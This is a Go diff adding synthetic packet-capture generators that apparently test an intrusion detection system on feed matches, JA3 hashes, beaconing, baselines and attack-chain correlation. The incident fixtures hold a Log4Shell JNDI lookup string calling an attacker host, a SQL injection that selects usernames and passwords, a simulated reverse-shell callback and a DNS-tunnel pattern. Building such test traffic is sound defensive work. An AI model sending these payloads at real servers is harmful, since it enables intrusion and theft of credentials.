@@ -1903,6 +1903,17 @@ func genDoT853(w *pcapgen.Writer) {
 	c.Close()
 }
 
+// genDoTScanProbeOnly: a scanner probes port 853 of two hosts. One
+// refuses (RST), the other answers SYN/ACK and the scanner resets it. No
+// data is ever sent to 853.
+func genDoTScanProbeOnly(w *pcapgen.Writer) {
+	w.Conn("203.0.113.50", 40853, "192.0.2.111", 853).Refuse()
+	c := w.Conn("203.0.113.50", 40854, "192.0.2.112", 853)
+	c.SYN()
+	c.SYNACK()
+	c.Reset(true)
+}
+
 // genSpoofedSYNFloodNoStreamFlows: 5000 SYNs from spoofed sources to
 // 192.0.2.10:80 in 1s, each answered SYN/ACK. None carries data, so the
 // stream stage must open no flow for them.
@@ -1912,5 +1923,486 @@ func genSpoofedSYNFloodNoStreamFlows(w *pcapgen.Writer) {
 		c := w.Conn(fmt.Sprintf("198.18.%d.%d", i/250, i%250+1), uint16(1024+i), "192.0.2.10", 80)
 		c.SYN()
 		c.SYNACK()
+	}
+}
+
+// Threat-intel feeds. The repo's rules.conf loads the example feeds in
+// feeds/: 203.0.113.200, 198.51.100.240/29 and 2001:db8:c2::/48;
+// malware.example.com, c2.example.net and phish.example.org; the JA3 of
+// feedJA3Hello (labeled ExampleBot) and of a bare TLS 1.3 hello.
+
+// feedJA3Hello's JA3 is "771,49195-49199-158,0-23-65281-10-11,29-23,0",
+// MD5 b54538bcff721c2cd9de6254e79a4406, listed in feeds/example_ja3.txt.
+var feedJA3Hello = pcapgen.ClientHello{Ciphers: []uint16{0xc02b, 0xc02f, 0x009e}, Exts: []uint16{23, 65281}, Groups: []uint16{29, 23}, Points: []byte{0}}
+
+// tlsTo opens an HTTPS connection and sends a ClientHello.
+func tlsTo(w *pcapgen.Writer, client string, cport uint16, server string, hello pcapgen.ClientHello) {
+	c := w.Conn(client, cport, server, 443)
+	c.Handshake()
+	c.Send(true, hello.Record())
+	c.Close()
+}
+
+// genIPFeedHitDst: 10.0.0.5 connects to the listed 203.0.113.200 on 443
+// and, 2s later, on 8080; a neighbour browses an unlisted server.
+func genIPFeedHitDst(w *pcapgen.Writer) {
+	tlsTo(w, "10.0.0.6", 50001, "192.0.2.43", pcapgen.ClientHello{SNI: "www.example.test", Ciphers: []uint16{0xc02f}})
+	tlsTo(w, "10.0.0.5", 50002, "203.0.113.200", pcapgen.ClientHello{SNI: "cdn.example.test", Ciphers: []uint16{0xc02f}})
+	w.Wait(2 * time.Second)
+	c := w.Conn("10.0.0.5", 50003, "203.0.113.200", 8080)
+	c.Handshake()
+	c.Close()
+}
+
+// genIPFeedHitSrc: 198.51.100.243 (in the listed /29) probes SSH on two
+// internal hosts; 198.51.100.239, just below the /29, does too.
+func genIPFeedHitSrc(w *pcapgen.Writer) {
+	for i, dst := range []string{"10.0.0.21", "10.0.0.22"} {
+		for _, src := range []string{"198.51.100.243", "198.51.100.239"} {
+			c := w.Conn(src, uint16(41000+i), dst, 22)
+			c.SYN()
+			c.Refuse()
+		}
+	}
+}
+
+// genDomainFeedDNS: a client resolves malware.example.com (listed) and
+// www.example.com (not), each answered.
+func genDomainFeedDNS(w *pcapgen.Writer) {
+	for i, name := range []string{"www.example.com", "malware.example.com"} {
+		id := uint16(0x4100 + i)
+		w.Add(pcapgen.Pkt{Proto: "udp", Src: "10.0.0.5", Dst: "192.0.2.53", Sport: uint16(53100 + i), Dport: 53, Payload: pcapgen.DNSQuery(id, name, 1)})
+		w.Add(pcapgen.Pkt{Proto: "udp", Src: "192.0.2.53", Dst: "10.0.0.5", Sport: 53, Dport: uint16(53100 + i), Payload: pcapgen.DNSAnswerA(id, name, [4]byte{192, 0, 2, 80})})
+	}
+}
+
+// genDomainFeedSNI: TLS to c2.example.net (listed) and to
+// www.example.net (not); the server address is unlisted.
+func genDomainFeedSNI(w *pcapgen.Writer) {
+	tlsTo(w, "10.0.0.5", 50010, "192.0.2.43", pcapgen.ClientHello{SNI: "www.example.net", Ciphers: []uint16{0xc02f}})
+	tlsTo(w, "10.0.0.7", 50011, "192.0.2.43", pcapgen.ClientHello{SNI: "C2.Example.Net", Ciphers: []uint16{0xc02f}})
+}
+
+// genDomainFeedSubdomain: subdomains of listed names match, look-alikes
+// do not. DNS for a.b.c2.example.net (match), notc2.example.net and
+// c2.example.net.example.test (no match); HTTP to
+// login.phish.example.org:8080 (match via the Host header).
+func genDomainFeedSubdomain(w *pcapgen.Writer) {
+	for i, name := range []string{"notc2.example.net", "c2.example.net.example.test", "a.b.c2.example.net"} {
+		id := uint16(0x4200 + i)
+		w.Add(pcapgen.Pkt{Proto: "udp", Src: "10.0.0.5", Dst: "192.0.2.53", Sport: uint16(53200 + i), Dport: 53, Payload: pcapgen.DNSQuery(id, name, 1)})
+	}
+	c := w.Conn("10.0.0.8", 50020, "192.0.2.80", 8080)
+	c.Handshake()
+	c.Send(true, []byte("GET /login HTTP/1.1\r\nHost: login.phish.example.org:8080\r\nUser-Agent: curl/8.5.0\r\n\r\n"))
+	c.Send(false, []byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"))
+	c.Close()
+}
+
+// genFeedPrivateEntryRejected: traffic to 10.9.9.9 and 192.168.1.20
+// (both in the scenario's feed, both rejected as private) and to
+// 203.0.113.201 (the feed's one valid entry).
+func genFeedPrivateEntryRejected(w *pcapgen.Writer) {
+	for i, dst := range []string{"10.9.9.9", "192.168.1.20", "203.0.113.201"} {
+		c := w.Conn("10.0.0.5", uint16(50030+i), dst, 80)
+		c.Handshake()
+		c.Close()
+	}
+}
+
+// genJA3FeedHit: 10.0.0.5 sends feedJA3Hello (labeled entry), 10.0.0.6 a
+// bare TLS 1.3 hello (unlabeled entry), 10.0.0.7 the usual test hello
+// (not listed).
+func genJA3FeedHit(w *pcapgen.Writer) {
+	h := feedJA3Hello
+	h.SNI = "update.example.test"
+	tlsTo(w, "10.0.0.5", 50040, "192.0.2.43", h)
+	tlsTo(w, "10.0.0.6", 50041, "192.0.2.43", pcapgen.ClientHello{SNI: "api.example.test", Ciphers: []uint16{0x1301}})
+	tlsTo(w, "10.0.0.7", 50042, "192.0.2.43", pcapgen.ClientHello{SNI: "www.example.test", Ciphers: []uint16{0xc02f}})
+}
+
+// genJA3GREASEStable: three clients send feedJA3Hello with a different
+// GREASE value each (and one without), the way browsers pick a fresh one
+// per connection. GREASE is left out of JA3, so all four hash the same.
+func genJA3GREASEStable(w *pcapgen.Writer) {
+	for i, g := range []uint16{0, 0x0a0a, 0x7a7a, 0xfafa} {
+		h := feedJA3Hello
+		h.SNI, h.GREASE = "update.example.test", g
+		tlsTo(w, fmt.Sprintf("10.0.0.%d", 10+i), uint16(50050+i), "192.0.2.43", h)
+	}
+}
+
+// beaconTLS is one HTTPS poll: a full connection carrying a ClientHello
+// with sni, from a new source port each time.
+func beaconTLS(w *pcapgen.Writer, client string, cport uint16, server, sni string) {
+	tlsTo(w, client, cport, server, pcapgen.ClientHello{SNI: sni, Ciphers: []uint16{0xc02f, 0xc030}, Exts: []uint16{23}, Groups: []uint16{29, 23}, Points: []uint8{0}})
+}
+
+// genBeaconFixed60s: 10.0.0.5 polls poll.example.net (203.0.113.77) over
+// HTTPS every 60s, 34 times; a neighbour loads two pages meanwhile.
+func genBeaconFixed60s(w *pcapgen.Writer) {
+	for i := range 34 {
+		beaconTLS(w, "10.0.0.5", uint16(50100+i), "203.0.113.77", "poll.example.net")
+		if i == 3 || i == 8 {
+			tlsTo(w, "10.0.0.6", uint16(51000+i), "192.0.2.43", pcapgen.ClientHello{SNI: "www.example.com", Ciphers: []uint16{0xc02f}})
+		}
+		w.Wait(60 * time.Second)
+	}
+}
+
+// genBeaconJitter20pct: 10.0.0.5 opens a TCP connection to
+// 198.51.100.77:8443 every 60s +-20% (uniform), 34 times.
+func genBeaconJitter20pct(w *pcapgen.Writer) {
+	rng := rand.New(rand.NewPCG(20, 20))
+	for i := range 34 {
+		c := w.Conn("10.0.0.5", uint16(50200+i), "198.51.100.77", 8443)
+		c.Handshake()
+		c.Push(true, []byte("GET-TASKS"))
+		c.Push(false, []byte("NONE"))
+		c.Close()
+		w.Wait(time.Duration(float64(60*time.Second) * (0.8 + 0.4*rng.Float64())))
+	}
+}
+
+// genBeaconWithSkips: 10.0.0.7 sends a UDP check-in to 203.0.113.78:5555
+// on a 60s schedule, answered each time, but skips every fourth beat
+// (44 slots, 33 check-ins).
+func genBeaconWithSkips(w *pcapgen.Writer) {
+	for i := range 44 {
+		if i%4 != 3 {
+			w.Add(pcapgen.Pkt{Proto: "udp", Src: "10.0.0.7", Dst: "203.0.113.78", Sport: 40555, Dport: 5555, Payload: []byte("hello")})
+			w.Wait(80 * time.Millisecond)
+			w.Add(pcapgen.Pkt{Proto: "udp", Src: "203.0.113.78", Dst: "10.0.0.7", Sport: 5555, Dport: 40555, Payload: []byte("sleep")})
+		}
+		w.Wait(60 * time.Second)
+	}
+}
+
+// genBrowsingRandomIntervals: 10.0.0.5 loads pages from one server
+// (192.0.2.43) at random 1-60s gaps, one to three connections per page.
+func genBrowsingRandomIntervals(w *pcapgen.Writer) {
+	rng := rand.New(rand.NewPCG(5, 60))
+	port := uint16(52000)
+	for range 40 {
+		for range 1 + rng.IntN(3) {
+			tlsTo(w, "10.0.0.5", port, "192.0.2.43", pcapgen.ClientHello{SNI: "news.example.com", Ciphers: []uint16{0xc02f}})
+			port++
+			w.Wait(150 * time.Millisecond)
+		}
+		w.Wait(time.Second + time.Duration(rng.Int64N(int64(59*time.Second))))
+	}
+}
+
+// beaconRandom: 10.0.0.5 opens 100 TCP connections to 192.0.2.44:8080
+// with the gaps gap returns.
+func beaconRandom(w *pcapgen.Writer, gap func() time.Duration) {
+	for i := range 100 {
+		c := w.Conn("10.0.0.5", uint16(52500+i), "192.0.2.44", 8080)
+		c.Handshake()
+		c.Push(true, []byte("PING"))
+		c.Push(false, []byte("PONG"))
+		c.Close()
+		w.Wait(gap())
+	}
+}
+
+// genBeaconUniformRandom: 100 connections at uniformly random 1-60s gaps.
+// With this seed a single check passes by chance (the rule before
+// persistence fired); four in a row do not.
+func genBeaconUniformRandom(w *pcapgen.Writer) {
+	rng := rand.New(rand.NewPCG(2, 2))
+	beaconRandom(w, func() time.Duration { return time.Second + time.Duration(rng.Int64N(int64(59*time.Second))) })
+}
+
+// genBeaconExponentialRandom: 100 connections at exponential gaps (mean
+// 30s, a Poisson process), a seed where a single check passes by chance.
+func genBeaconExponentialRandom(w *pcapgen.Writer) {
+	rng := rand.New(rand.NewPCG(46, 3))
+	beaconRandom(w, func() time.Duration { return time.Duration(rng.ExpFloat64() * float64(30*time.Second)) })
+}
+
+// genNTPPeriodic: 10.0.0.10 polls its NTP server every 64s and resolves
+// the same name every 60s through its resolver (a new source port each
+// time), 20 times each.
+func genNTPPeriodic(w *pcapgen.Writer) {
+	ntp := make([]byte, 48)
+	ntp[0] = 0x23
+	for i := range 20 {
+		w.Add(pcapgen.Pkt{Proto: "udp", Src: "10.0.0.10", Dst: "192.0.2.123", Sport: 123, Dport: 123, Payload: ntp})
+		w.Wait(30 * time.Millisecond)
+		w.Add(pcapgen.Pkt{Proto: "udp", Src: "192.0.2.123", Dst: "10.0.0.10", Sport: 123, Dport: 123, Payload: ntp})
+		id := uint16(0x5200 + i)
+		w.Add(pcapgen.Pkt{Proto: "udp", Src: "10.0.0.10", Dst: "192.0.2.53", Sport: uint16(53200 + i), Dport: 53, Payload: pcapgen.DNSQuery(id, "time.example.com", 1)})
+		w.Wait(10 * time.Millisecond)
+		w.Add(pcapgen.Pkt{Proto: "udp", Src: "192.0.2.53", Dst: "10.0.0.10", Sport: 53, Dport: uint16(53200 + i), Payload: pcapgen.DNSAnswerA(id, "time.example.com", [4]byte{192, 0, 2, 123})})
+		w.Wait(60 * time.Second)
+		if i%4 == 0 {
+			w.Wait(4 * time.Second)
+		}
+	}
+}
+
+// genKeepaliveSingleConnection: one long TCP connection from 10.0.0.5 to
+// 203.0.113.79:443 with a small exchange every 60s for 20 minutes.
+func genKeepaliveSingleConnection(w *pcapgen.Writer) {
+	c := w.Conn("10.0.0.5", 50300, "203.0.113.79", 443)
+	c.Handshake()
+	c.Send(true, pcapgen.ClientHello{SNI: "push.example.org", Ciphers: []uint16{0xc02f}}.Record())
+	for range 20 {
+		w.Wait(60 * time.Second)
+		c.Push(true, []byte{0x17, 0x03, 0x03, 0x00, 0x02, 0x00, 0x00})
+		c.Push(false, []byte{0x17, 0x03, 0x03, 0x00, 0x02, 0x00, 0x00})
+	}
+	c.Close()
+}
+
+// baselineBackground is the steady traffic of the baseline scenarios:
+// 10.0.0.20 sends UDP datagrams to 192.0.2.10:5000.
+var baselineBackground = pcapgen.Pkt{Proto: "udp", Src: "10.0.0.20", Dst: "192.0.2.10", Sport: 40000, Dport: 5000, Payload: make([]byte, 64)}
+
+// baselinePhase writes secs seconds of pps background datagrams per
+// second, plus the packets extra returns for each second (nil: none).
+// The packets of one second are 5ms apart, and each second starts on
+// time whatever time Add takes.
+func baselinePhase(w *pcapgen.Writer, secs, pps int, extra func(sec int) []pcapgen.Pkt) {
+	begin := w.Now
+	for s := range secs {
+		w.Now = begin.Add(time.Duration(s) * time.Second)
+		var ps []pcapgen.Pkt
+		for range pps {
+			ps = append(ps, baselineBackground)
+		}
+		if extra != nil {
+			ps = append(ps, extra(s)...)
+		}
+		for _, p := range ps {
+			w.Add(p)
+			w.Wait(5 * time.Millisecond)
+		}
+	}
+	w.Now = begin.Add(time.Duration(secs) * time.Second)
+}
+
+// genBaselineLearningNoAlert: 1 datagram/s, with a 4-minute burst of 50/s
+// during the 10-minute learning period, then 1/s again.
+func genBaselineLearningNoAlert(w *pcapgen.Writer) {
+	baselinePhase(w, 180, 1, nil)
+	baselinePhase(w, 240, 50, nil)
+	baselinePhase(w, 540, 1, nil)
+}
+
+// genBaselineSustainedSpike: 12 minutes at 1 datagram/s, 4 at 50/s, 2 at
+// 1/s.
+func genBaselineSustainedSpike(w *pcapgen.Writer) {
+	baselinePhase(w, 720, 1, nil)
+	baselinePhase(w, 240, 50, nil)
+	baselinePhase(w, 120, 1, nil)
+}
+
+// genBaselineSingleSpike: as genBaselineSustainedSpike, but the burst
+// lasts one interval.
+func genBaselineSingleSpike(w *pcapgen.Writer) {
+	baselinePhase(w, 720, 1, nil)
+	baselinePhase(w, 60, 50, nil)
+	baselinePhase(w, 300, 1, nil)
+}
+
+// genBaselineHostFanout: 10.0.0.30 sends a datagram about every 10s, at
+// random, to one of three servers for 12 minutes, then to 200 distinct
+// addresses a minute for 3 minutes, then back to its three servers for a
+// minute.
+func genBaselineHostFanout(w *pcapgen.Writer) {
+	rng := rand.New(rand.NewPCG(30, 3))
+	usual := func(int) []pcapgen.Pkt {
+		if rng.IntN(10) != 0 {
+			return nil
+		}
+		return []pcapgen.Pkt{{Proto: "udp", Src: "10.0.0.30", Dst: fmt.Sprintf("192.0.2.%d", 20+rng.IntN(3)), Sport: 41000, Dport: uint16(6000 + rng.IntN(1000)), Payload: []byte("hello")}}
+	}
+	baselinePhase(w, 720, 1, usual)
+	baselinePhase(w, 180, 1, func(s int) []pcapgen.Pkt {
+		var ps []pcapgen.Pkt
+		for i := (s % 60) * 200 / 60; i < (s%60+1)*200/60; i++ {
+			ps = append(ps, pcapgen.Pkt{Proto: "udp", Src: "10.0.0.30", Dst: fmt.Sprintf("198.51.100.%d", 1+i), Sport: 41000, Dport: 6000, Payload: []byte("hello")})
+		}
+		return ps
+	})
+	baselinePhase(w, 60, 1, usual)
+}
+
+// genBaselineLearnedZeroSmallActivity: 12 minutes of background with no
+// DNS at all, then 5 minutes in which 10.0.0.20 resolves the same name 9
+// times every 10s (0.9 queries/s), each answered by 192.0.2.53.
+func genBaselineLearnedZeroSmallActivity(w *pcapgen.Writer) {
+	baselinePhase(w, 720, 1, nil)
+	baselinePhase(w, 300, 1, func(sec int) []pcapgen.Pkt {
+		if sec%10 == 9 {
+			return nil
+		}
+		id := uint16(0x6000 + sec)
+		return []pcapgen.Pkt{
+			{Proto: "udp", Src: "10.0.0.20", Dst: "192.0.2.53", Sport: uint16(54000 + sec), Dport: 53, Payload: pcapgen.DNSQuery(id, "www.example.com", 1)},
+			{Proto: "udp", Src: "192.0.2.53", Dst: "10.0.0.20", Sport: 53, Dport: uint16(54000 + sec), Payload: pcapgen.DNSAnswerA(id, "www.example.com", [4]byte{192, 0, 2, 80})},
+		}
+	})
+}
+
+// genBaselinePoisoningFrozen: 12 minutes at 1 datagram/s, a 20-minute
+// attack at 50/s, 3 minutes at 1/s, then 4 minutes at 45/s and one at
+// 1/s. The baseline does not learn from the long attack, so the second,
+// smaller burst still stands out against it.
+func genBaselinePoisoningFrozen(w *pcapgen.Writer) {
+	baselinePhase(w, 720, 1, nil)
+	baselinePhase(w, 1200, 50, nil)
+	baselinePhase(w, 180, 1, nil)
+	baselinePhase(w, 240, 45, nil)
+	baselinePhase(w, 60, 1, nil)
+}
+
+// Incident scenarios: the attacker 203.0.113.9 and the web server
+// 10.0.0.80 (inside HOME_NET, so its beacons are watched).
+const (
+	incAttacker = "203.0.113.9"
+	incVictim   = "10.0.0.80"
+	incC2       = "198.51.100.66" // c2.example.net, in feeds/example_domain.txt
+)
+
+// incScan SYN-scans ports 1-100 of dst from src (22 and 80 open).
+func incScan(w *pcapgen.Writer, src, dst string) {
+	step := w.Step
+	w.Step = time.Millisecond
+	for _, p := range scanOrder(100) {
+		synProbe(w, src, 45000, dst, p, p == 22 || p == 80)
+	}
+	w.Step = step
+}
+
+// incRequest sends one HTTP request from src to dst:80 on a new,
+// completed connection.
+func incRequest(w *pcapgen.Writer, src string, sport uint16, dst, req string) {
+	c := w.Conn(src, sport, dst, 80)
+	c.Handshake()
+	c.Send(true, []byte(req))
+	c.Send(false, []byte(okResp))
+	c.Close()
+}
+
+var (
+	incLog4Shell = webGet("/", "User-Agent: ${jndi:ldap://203.0.113.9:1389/Exploit}")
+	incSQLi      = webGet("/products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users--%20-")
+)
+
+// incC2Hello: the victim opens HTTPS to c2.example.net.
+func incC2Hello(w *pcapgen.Writer, cport uint16) {
+	beaconTLS(w, incVictim, cport, incC2, "c2.example.net")
+}
+
+// genKillChainFull: 203.0.113.9 SYN-scans 10.0.0.80, 10 minutes later
+// sends it a Log4Shell request, and 2 minutes after that 10.0.0.80 starts
+// polling c2.example.net every 60s (34 times) and, after the fifth poll,
+// runs a DNS tunnel (70 random base32 subdomains over UDP).
+func genKillChainFull(w *pcapgen.Writer) {
+	incScan(w, incAttacker, incVictim)
+	w.Wait(10 * time.Minute)
+	incRequest(w, "10.0.0.12", 44000, incVictim, webGet("/index.html", "User-Agent: Mozilla/5.0"))
+	incRequest(w, incAttacker, 44100, incVictim, incLog4Shell)
+	w.Wait(2 * time.Minute)
+	r := rand.New(rand.NewPCG(3, 4))
+	for i := range 34 {
+		incC2Hello(w, uint16(50100+i))
+		if i == 5 {
+			w.Step = 100 * time.Millisecond
+			for j := range 70 {
+				dnsLookup(w, incVictim, uint16(53000+j), uint16(j+1), b32(r, 52)+"."+b32(r, 20)+".tunnel-test.example", 1, 0)
+			}
+			w.Step = time.Millisecond
+		}
+		w.Wait(60 * time.Second)
+	}
+}
+
+// genCallback: a UNION SELECT from 203.0.113.9 to 10.0.0.80, then after
+// delay 10.0.0.80 connects to 203.0.113.9:4444 (a reverse shell).
+func genCallback(delay time.Duration) func(w *pcapgen.Writer) {
+	return func(w *pcapgen.Writer) {
+		incRequest(w, incAttacker, 44100, incVictim, incSQLi)
+		w.Wait(delay)
+		c := w.Conn(incVictim, 38000, incAttacker, 4444)
+		c.Handshake()
+		c.Push(true, []byte("uid=33(www-data) gid=33(www-data)\n"))
+		c.Close()
+	}
+}
+
+// genReconOnly: a SYN scan and nothing else.
+func genReconOnly(w *pcapgen.Writer) {
+	incScan(w, incAttacker, incVictim)
+}
+
+// genUnrelatedAlerts: five hosts each raise one low-severity alert, a
+// minute apart: a ping sweep, a DoH lookup, a DoT connection, an
+// oversized ping and a malformed DNS message.
+func genUnrelatedAlerts(w *pcapgen.Writer) {
+	for i := range 16 {
+		echoPair(w, "10.0.0.31", fmt.Sprintf("10.0.1.%d", i+1), 7, uint16(i), linuxPing(56, uint16(i)), false)
+	}
+	w.Wait(time.Minute)
+	tlsTo(w, "10.0.0.32", 50001, "192.0.2.43", pcapgen.ClientHello{SNI: "dns.google", Ciphers: []uint16{0xc02f}})
+	w.Wait(time.Minute)
+	c := w.Conn("10.0.0.33", 50002, "192.0.2.44", 853)
+	c.Handshake()
+	c.Push(true, []byte("hello"))
+	c.Close()
+	w.Wait(time.Minute)
+	echoPair(w, "10.0.0.34", "192.0.2.45", 9, 1, linuxPing(1500, 1), true)
+	w.Wait(time.Minute)
+	w.Add(pcapgen.Pkt{Proto: "udp", Src: "10.0.0.35", Dst: "192.0.2.53", Sport: 53001, Dport: 53, Payload: []byte{0, 1, 1, 0, 0, 1}})
+}
+
+// genSpoofedFraming: packets with the innocent 10.0.0.66 as spoofed
+// source SYN-scan 10.0.0.80 and then flood it with 12000 UDP datagrams
+// in 3s; meanwhile 203.0.113.9 sends it a real UNION SELECT.
+func genSpoofedFraming(w *pcapgen.Writer) {
+	const innocent = "10.0.0.66"
+	incRequest(w, innocent, 41000, incVictim, webGet("/index.html", "User-Agent: Mozilla/5.0"))
+	incScan(w, innocent, incVictim)
+	w.Wait(time.Minute)
+	incRequest(w, incAttacker, 44100, incVictim, incSQLi)
+	w.Wait(time.Minute)
+	w.Step = 250 * time.Microsecond
+	for range 12000 {
+		w.Add(pcapgen.Pkt{Proto: "udp", Src: innocent, Dst: incVictim, Sport: 40000, Dport: 9999, Payload: make([]byte, 64)})
+	}
+}
+
+// genReverseOrder: 10.0.0.80 contacts c2.example.net (c2), and 3 hours
+// later SYN-scans that server (recon): stages out of order.
+func genReverseOrder(w *pcapgen.Writer) {
+	incC2Hello(w, 50100)
+	w.Wait(3 * time.Hour)
+	incScan(w, incVictim, incC2)
+}
+
+// genStageWindowExpired: a SYN scan, then 30 hours later a Log4Shell
+// request from the same attacker.
+func genStageWindowExpired(w *pcapgen.Writer) {
+	incScan(w, incAttacker, incVictim)
+	w.Wait(30 * time.Hour)
+	incRequest(w, incAttacker, 44100, incVictim, incLog4Shell)
+}
+
+// genIncidentUpdatesLimited: a scan, then for 107 minutes 203.0.113.9
+// sends a Log4Shell request every 61s (past the 60s dedup window, so
+// each one alerts) and, from the fifth minute, 10.0.0.80 contacts
+// c2.example.net every 61s: over 200 contributing alerts in all.
+func genIncidentUpdatesLimited(w *pcapgen.Writer) {
+	incScan(w, incAttacker, incVictim)
+	w.Wait(5 * time.Minute)
+	for i := range 105 {
+		incRequest(w, incAttacker, uint16(44100+i), incVictim, incLog4Shell)
+		if i >= 5 {
+			incC2Hello(w, uint16(50100+i))
+		}
+		w.Wait(61 * time.Second)
 	}
 }
